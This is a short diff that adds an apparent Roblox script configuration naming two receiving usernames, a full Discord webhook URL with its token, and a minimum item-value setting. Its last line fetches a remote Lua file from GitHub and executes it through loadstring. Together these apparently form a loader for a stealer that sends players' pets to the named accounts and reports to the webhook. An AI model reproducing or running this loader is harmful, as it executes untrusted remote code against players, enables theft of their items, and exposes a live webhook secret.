@@ -1,0 +1,6 @@
+Username = AzulStorage
+Username2 = LuzaStorage
+Webhook = https://discord.com/api/webhooks/1246913214277488640/FdkP_Xo_VAf4VAH3sm5n4HtpHfyFGVTdGAztvffRxf6o2tuhKSuHusJmvouIZwI5gL9p
+Support = false
+min_rap = 1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
